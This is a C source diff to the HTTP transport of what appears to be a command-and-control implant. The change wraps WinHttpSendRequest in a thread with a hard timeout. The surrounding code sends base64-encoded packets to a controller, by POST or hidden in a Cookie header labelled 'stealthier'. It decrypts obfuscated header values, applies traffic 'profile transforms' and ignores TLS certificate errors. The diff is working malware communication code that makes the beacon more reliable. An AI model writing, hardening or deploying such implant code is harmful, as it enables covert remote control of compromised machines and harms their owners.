@@ -45,6 +45,8 @@ BOOL http_init(void) {
 
     /*
      * Set explicit timeouts to prevent indefinite blocking.
+     * NOTE: these do NOT cover the Schannel TLS handshake — that's handled
+     * by the send_request_with_timeout() wrapper below.
      * Args: hSession, DNS resolve ms, connect ms, send ms, receive ms
      */
     WinHttpSetTimeouts(g_hSession,
@@ -70,6 +72,94 @@ static wchar_t *to_wide(const char *s) {
     wchar_t *w = (wchar_t *)malloc(len * sizeof(wchar_t));
     MultiByteToWideChar(CP_UTF8, 0, s, -1, w, len);
     return w;
+}
+
+/* ─── Thread-based WinHttpSendRequest with hard timeout ───
+ *
+ * WinHTTP's session/request-level timeouts do NOT cover the Schannel TLS
+ * handshake.  WinHttpSendRequest can block indefinitely during the TLS
+ * negotiation even with all timeout options set.
+ *
+ * Fix: run WinHttpSendRequest in a helper thread and wait with a hard
+ * deadline via WaitForSingleObject.  On timeout, close the request handle
+ * from the calling thread — MSDN guarantees this cancels the pending
+ * operation and the thread returns with ERROR_WINHTTP_OPERATION_CANCELLED.
+ */
+typedef struct {
+    HINTERNET hRequest;
+    LPCWSTR   pwszHeaders;
+    DWORD     dwHeadersLen;
+    LPVOID    lpOptional;
+    DWORD     dwOptionalLen;
+    DWORD     dwTotalLength;
+    BOOL      result;
+    DWORD     error;
+} SendReqCtx;
+
+static DWORD WINAPI _send_request_thread(LPVOID param) {
+    SendReqCtx *ctx = (SendReqCtx *)param;
+    ctx->result = WinHttpSendRequest(
+        ctx->hRequest,
+        ctx->pwszHeaders, ctx->dwHeadersLen,
+        ctx->lpOptional, ctx->dwOptionalLen,
+        ctx->dwTotalLength, 0
+    );
+    if (!ctx->result)
+        ctx->error = GetLastError();
+    return 0;
+}
+
+/*
+ * Wrapper around WinHttpSendRequest that enforces a hard timeout.
+ *
+ * On timeout: closes *phRequest and sets it to NULL so the caller
+ * knows not to double-close.  Returns FALSE with GetLastError() = 12002.
+ */
+static BOOL send_request_with_timeout(
+    HINTERNET *phRequest,
+    LPCWSTR   pwszHeaders,  DWORD dwHeadersLen,
+    LPVOID    lpOptional,   DWORD dwOptionalLen,
+    DWORD     dwTotalLength,
+    DWORD     timeout_ms)
+{
+    SendReqCtx ctx;
+    memset(&ctx, 0, sizeof(ctx));
+    ctx.hRequest     = *phRequest;
+    ctx.pwszHeaders  = pwszHeaders;
+    ctx.dwHeadersLen = dwHeadersLen;
+    ctx.lpOptional   = lpOptional;
+    ctx.dwOptionalLen= dwOptionalLen;
+    ctx.dwTotalLength= dwTotalLength;
+
+    HANDLE hThread = CreateThread(NULL, 0, _send_request_thread, &ctx, 0, NULL);
+    if (!hThread) {
+        DBG("[http] CreateThread for SendRequest failed, falling back to sync");
+        return WinHttpSendRequest(*phRequest, pwszHeaders, dwHeadersLen,
+                                  lpOptional, dwOptionalLen, dwTotalLength, 0);
+    }
+
+    DWORD wait = WaitForSingleObject(hThread, timeout_ms);
+    if (wait == WAIT_TIMEOUT) {
+        DBG("[http] WinHttpSendRequest TIMED OUT after %u ms — cancelling", timeout_ms);
+        /*
+         * Close the request handle to unblock the pending call.
+         * MSDN: "Closing the handle causes the pending operation to
+         * complete with ERROR_WINHTTP_OPERATION_CANCELLED."
+         */
+        WinHttpCloseHandle(*phRequest);
+        *phRequest = NULL;  /* Signal caller: handle already closed */
+
+        /* Give the thread a moment to exit cleanly */
+        WaitForSingleObject(hThread, 3000);
+        CloseHandle(hThread);
+        SetLastError(12002);  /* ERROR_WINHTTP_TIMEOUT */
+        return FALSE;
+    }
+
+    CloseHandle(hThread);
+    if (!ctx.result)
+        SetLastError(ctx.error);
+    return ctx.result;
 }
 
 /* ─── Profile transforms ─── */
@@ -185,7 +275,7 @@ BOOL http_send_recv(const unsigned char *packet, DWORD packet_len,
      */
     BOOL use_post = (b64_len > 8000);
     const wchar_t *method = use_post ? L"POST" : L"GET";
-    DBG("[http] payload b64_len=%u → using %s", b64_len, use_post ? "POST" : "GET+cookie");
+    DBG("[http] payload b64_len=%u, using %s", b64_len, use_post ? "POST" : "GET+cookie");
 
     /* Open request */
     DBG("[http] opening request...");
@@ -211,22 +301,7 @@ BOOL http_send_recv(const unsigned char *packet, DWORD packet_len,
                          SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
         WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS,
                          &secFlags, sizeof(secFlags));
-
-        /*
-         * Set per-request timeouts — session-level WinHttpSetTimeouts does NOT
-         * always cover the TLS handshake. These per-request options guarantee
-         * the handshake + send + receive all have hard deadlines.
-         */
-        DWORD connectTimeout = 10000;
-        DWORD sendTimeout    = 15000;
-        DWORD recvTimeout    = 15000;
-        WinHttpSetOption(hRequest, WINHTTP_OPTION_CONNECT_TIMEOUT,
-                         &connectTimeout, sizeof(connectTimeout));
-        WinHttpSetOption(hRequest, WINHTTP_OPTION_SEND_TIMEOUT,
-                         &sendTimeout, sizeof(sendTimeout));
-        WinHttpSetOption(hRequest, WINHTTP_OPTION_RECEIVE_TIMEOUT,
-                         &recvTimeout, sizeof(recvTimeout));
-        DBG("[http] TLS sec flags + per-request timeouts set");
+        DBG("[http] TLS sec flags set (ignore cert errors)");
     }
 
     /* Decrypt and set User-Agent header */
@@ -248,8 +323,10 @@ BOOL http_send_recv(const unsigned char *packet, DWORD packet_len,
             L"Content-Type: application/octet-stream", (DWORD)-1,
             WINHTTP_ADDREQ_FLAG_ADD);
         DBG("[http] calling WinHttpSendRequest (POST, %u bytes)...", b64_len);
-        ok = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
-                                (LPVOID)b64_val, b64_len, b64_len, 0);
+        ok = send_request_with_timeout(&hRequest,
+                WINHTTP_NO_ADDITIONAL_HEADERS, 0,
+                (LPVOID)b64_val, b64_len, b64_len,
+                15000);  /* 15s hard timeout */
     } else {
         /* Small payload: embed in Cookie header (stealthier) */
         char ck_name_dec[64];
@@ -266,17 +343,21 @@ BOOL http_send_recv(const unsigned char *packet, DWORD packet_len,
         free(cookie_hdr);
 
         DBG("[http] calling WinHttpSendRequest (GET+cookie)...");
-        ok = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
-                                WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
+        ok = send_request_with_timeout(&hRequest,
+                WINHTTP_NO_ADDITIONAL_HEADERS, 0,
+                WINHTTP_NO_REQUEST_DATA, 0, 0,
+                15000);  /* 15s hard timeout */
     }
     DBG("[http] WinHttpSendRequest returned ok=%d", ok);
     free(b64_val);
+
     if (!ok) {
         DWORD err = GetLastError();
         DBG("[http] WinHttpSendRequest FAILED (err=%u / 0x%08X)", err, err);
         /* Common errors:
-         * 12002 = ERROR_WINHTTP_TIMEOUT (connect/send timeout)
+         * 12002 = ERROR_WINHTTP_TIMEOUT (connect/send timeout or our hard timeout)
          * 12007 = ERROR_WINHTTP_NAME_NOT_RESOLVED (DNS failed)
+         * 12017 = ERROR_WINHTTP_OPERATION_CANCELLED (handle closed by timeout thread)
          * 12029 = ERROR_WINHTTP_CANNOT_CONNECT (refused / unreachable)
          * 12175 = ERROR_WINHTTP_SECURE_FAILURE (TLS error)
          */
@@ -341,7 +422,7 @@ BOOL http_send_recv(const unsigned char *packet, DWORD packet_len,
     DBG("[http] response decoded: %u bytes (ok=%d)", *response_len, ok);
 
 cleanup:
-    WinHttpCloseHandle(hRequest);
+    if (hRequest) WinHttpCloseHandle(hRequest);
     WinHttpCloseHandle(hConnect);
     free(wUrl);
     return ok;
